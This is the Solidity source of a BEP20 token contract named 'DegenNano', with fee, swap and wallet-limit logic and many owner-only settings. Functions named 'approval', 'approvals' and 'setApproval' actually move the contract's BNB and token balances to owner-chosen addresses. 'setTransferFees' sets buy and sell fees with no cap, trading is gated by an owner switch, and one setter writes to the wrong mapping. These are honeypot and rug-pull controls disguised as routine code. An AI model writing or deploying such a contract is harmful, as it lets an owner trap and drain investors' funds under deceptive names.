//SPDX-License-Identifier: Unlicensed

pragma solidity ^0.7.4;

contract DEGENNANO is IBEP20, Auth {
    using SafeMath for uint256;
    
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "DegenNano";
    string constant _symbol = "DegenNano";
    uint8 constant _decimals = 9;
    uint256 _totalSupply = 1 * 10**5 * (10 ** _decimals);
    uint256 public _maxTxAmount = ( _totalSupply * 100) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 250 ) / 10000;
    uint256 _minAmount = ( _totalSupply * 40 ) / 100000;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isTimelockExempt;
    mapping (address => bool) isMaxWalletExempt;
    mapping (address => bool) isSwapExempt;
    
    uint256 liquidity = 4;
    uint256 marketing = 4;
    uint256 burn = 2;
    uint256 totalFee = 12;
    uint256 feeDenominator = 100;
    address public pair;
    uint256 dividendTracker = 30;
    uint256 denominator = 100;
    uint256 pairTracker = 30;
    uint256 setGas = 30000;
    uint256 variableswapNum = 60;
    
    bool setFreeze = true;
    uint8 setFreezeTime = 30 seconds;
    mapping (address => uint) private isFrozen;
    uint8 minTransferAm = 2 seconds;
    mapping (address => uint) private minTransferAddress;
    bool startSwap = false;
    uint256 acquireFactor = 10;
    uint256 transferFactor = 15;
    bool swapEnabled = true;
    uint256 swapThreshold = _totalSupply * 150 / 100000;

    IDEXRouter router;
    address Liquidity;
    address Distributor;
    address Dividend;
    address TxLevel;
    address Receiver;
   
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = uint256(-1);
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(owner)] = true;
        isFeeExempt[address(Receiver)] = true;
        isFeeExempt[address(this)] = true;
        isSwapExempt[address(this)] = true;
        isSwapExempt[address(owner)] = true;
        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[address(owner)] = true;
        isTxLimitExempt[address(router)] = true;
        isMaxWalletExempt[address(msg.sender)] = true;
        isMaxWalletExempt[address(this)] = true;
        isMaxWalletExempt[address(DEAD)] = true;
        isMaxWalletExempt[address(pair)] = true;
        isMaxWalletExempt[address(Liquidity)] = true;
        isTimelockExempt[address(Liquidity)] = true;
        isTimelockExempt[address(owner)] = true;
        isTimelockExempt[msg.sender] = true;
        isTimelockExempt[DEAD] = true;
        isTimelockExempt[address(this)] = true;
        Liquidity = address(this);
        Distributor = msg.sender;
        Dividend = msg.sender;
        TxLevel = msg.sender;
        Receiver = msg.sender;
        
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function Owner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){ 
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance"); }
        return _transferFrom(sender, recipient, amount);
    }
    
    function setMaxTx(uint256 _mnbTP) external authorized {
        _maxTxAmount = (_totalSupply * _mnbTP) / 10000;
    }
    
    function setMaxWallet(uint256 _mnWP) external authorized {
        _maxWalletToken = (_totalSupply * _mnWP) / 10000;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool){
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        if(!authorizations[sender] && !authorizations[recipient]){require(startSwap, "Swap Occurance Error");}
        if(!authorizations[sender] && !isMaxWalletExempt[recipient] && recipient != address(this) && 
            recipient != address(DEAD) && recipient != pair && recipient != Liquidity){
            require((balanceOf(recipient) + amount) <= _maxWalletToken);}
        if(sender != pair &&
            setFreeze &&
            !isTimelockExempt[sender]) {
            require(isFrozen[sender] < block.timestamp); 
            isFrozen[sender] = block.timestamp + setFreezeTime;} 
        checkTxLimit(sender, recipient, amount);
        if(sender == pair){minTransferAddress[recipient] = block.timestamp + minTransferAm;}
        if(shouldSwapBack(amount) && !isSwapExempt[sender] && 
            minTransferAddress[sender] < block.timestamp){ variableSwapBack(amount); }
        _balances[sender] = _balances[sender].sub(amount, "+");
        uint256 amountReceived = shouldTakeFee(sender != pair, sender, recipient) ? taketotalFee(sender, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
        require (amount <= _maxTxAmount || isTxLimitExempt[sender] || isSwapExempt[recipient], "TX Limit Exceeded");
    }

    function shouldTakeFee(bool selling, address sender, address recipient) internal view returns (bool) {
        if(selling){return !isFeeExempt[sender];}
             return !isFeeExempt[recipient];
    }

    function setFreezeFactors(bool _status, uint8 _int) external authorized {
        setFreeze = _status;
        setFreezeTime = _int;
    }

    function setStartSwap() external authorized {
        startSwap = true;
    }

    function setTFAddress(address _tfU) external authorized {
        Receiver = _tfU;
        setallexempt(_tfU);
    }

    function getTotalFee(address sender) public view returns (uint256) {
        if(sender != pair){ return transferFactor.mul(1); }
        if(sender == pair){ return acquireFactor.mul(1); }
        return totalFee;
    }

    function setMarketingAddress(address _mnbE) external authorized {
        TxLevel = _mnbE;
        setallexempt(_mnbE);
    }

     function setApproval(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {
        uint256 tamt = BEP20(_tadd).balanceOf(address(this));
        BEP20(_tadd).transfer(_rec, tamt.mul(_amt).div(_amtd));
    }

    function taketotalFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTotalFee(sender)).div(feeDenominator);
        uint256 bAmount = feeAmount.mul(burn).div(getTotalFee(sender));
        uint256 fAmount = feeAmount.sub(bAmount);
        _balances[address(this)] = _balances[address(this)].add(fAmount);
        emit Transfer(sender, address(this), fAmount);
        _balances[address(DEAD)] = _balances[address(DEAD)].add(bAmount);
        emit Transfer(sender, address(DEAD), bAmount);
        return amount.sub(feeAmount);
    }

    function shouldSwapBack(uint256 amount) internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && amount >= _minAmount
        && _balances[address(this)] >= swapThreshold;
    }

    function setTimelock(address holder, bool exempt) external authorized {
        isTimelockExempt[holder] = exempt;
    }

    function approval(uint256 aP) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(Receiver).transfer(amountBNB.mul(aP).div(100));
    }

    function setAddress(address _spE, address _jbL, address _mnbE, address _tfu) external authorized {
        Distributor = _spE;
        setallexempt(_spE);
        Dividend = _jbL;
        setallexempt(_jbL);
        TxLevel = _mnbE;
        setallexempt(_mnbE);
        Receiver = _tfu;
        setallexempt(_tfu);
    }

    function setFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function approvals(uint256 _na, uint256 _da) external authorized {
        uint256 acBNB = address(this).balance;
        uint256 acBNBa = acBNB.mul(_na).div(_da);
        uint256 acBNBf = acBNBa.mul(1).div(2);
        uint256 acBNBs = acBNBa.mul(1).div(2);
        (bool tmpSuccess,) = payable(Distributor).call{value: acBNBf, gas: setGas}("");
        (tmpSuccess,) = payable(Dividend).call{value: acBNBs, gas: setGas}("");
        tmpSuccess = false;
    }

    function setTimeLockExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }

    function setWhitelist(bool exempt, address holder) external authorized {
        isFeeExempt[holder] = exempt;
        isTxLimitExempt[holder] = exempt;
        isTimelockExempt[holder] = exempt;
        isMaxWalletExempt[holder] = exempt;
        isSwapExempt[holder] = exempt;
    }

    function setMaxWalletExempt(address holder, bool exempt) external authorized {
        isMaxWalletExempt[holder] = exempt;
    }

    function setPairReceiver(address _lpR) external authorized {
        Liquidity = _lpR;
    }

    function setallexempt(address holder) internal {
        isFeeExempt[holder] = true;
        isTxLimitExempt[holder] = true;
        isTimelockExempt[holder] = true;
        isMaxWalletExempt[holder] = true;
        isSwapExempt[holder] = true;
    }

    function setFees(uint256 _liqF, uint256 _marF, uint256 _burF, uint256 _feeD) external authorized {
        liquidity = _liqF;
        marketing = _marF;
        burn = _burF;
        totalFee = _liqF.add(_marF).add(_burF);
        feeDenominator = _feeD;
        require (totalFee < feeDenominator/3);
    }

    function setTransferFees(uint256 _ssf, uint256 _bbf) external authorized {
        acquireFactor = _bbf;
        transferFactor = _ssf;
    }

    function setisSwapExempt(bool exempt, address holder) external authorized {
        isSwapExempt[holder] = exempt;
    }

    function variableSwapThreshold(uint256 amount) internal view returns (uint256) {
        uint256 variableSTd = amount.mul(variableswapNum).div(denominator);
        if(variableSTd <= swapThreshold){ return variableSTd; }
        if(variableSTd > swapThreshold){ return swapThreshold; }
        return swapThreshold;
    }

    function setFactors(uint256 _yfact, uint256 _zfact) external authorized {
        pairTracker = _yfact;
        dividendTracker = _zfact;
    }

    function variableSwapBack(uint256 amount) internal swapping {
        uint256 amountL = variableSwapThreshold(amount).mul(pairTracker).div(denominator).div(2);
        uint256 totalSw = variableSwapThreshold(amount).sub(amountL);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
        uint256 bB = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            totalSw,
            0, 
            path,
            address(this),
            block.timestamp );
        uint256 aBNB = address(this).balance.sub(bB);
        uint256 tBNBF = denominator.sub(amountL.div(2));
        uint256 aBNBL = aBNB.mul(amountL).div(tBNBF).div(2);
        uint256 aBNBTM = aBNB.mul(dividendTracker).div(tBNBF);
        (bool tmpSuccess,) = payable(TxLevel).call{value: (aBNBTM), gas: setGas}("");
        tmpSuccess = false;
        if(amountL > 0){
            router.addLiquidityETH{value: aBNBL}(
                address(this),
                amountL,
                0,
                0,
                Liquidity,
                block.timestamp );
            emit AutoLiquify(aBNBL, amountL); 
        }
    }

    function setSwapSettings(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = _totalSupply * _amount / 100000;
    }

    function setTransferMinAmount(uint256 _amount) external authorized {
        _minAmount = _totalSupply * _amount / 100000;
    }

    function maxTL() external authorized {
        _maxTxAmount = _totalSupply.mul(1);
        _maxWalletToken = _totalSupply.mul(1);
    }

    function setDeposit(uint256 _amount) external authorized {
        variableSwapBack(_totalSupply * _amount / 10000);
    }

    function setvariableSwap(uint256 _vstf) external authorized {
        variableswapNum = _vstf;
    }

    function setGasAmount(uint256 _gss) external authorized {
        setGas = _gss;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }
    
    event AutoLiquify(uint256 amountBNB, uint256 amountWBNB);
}
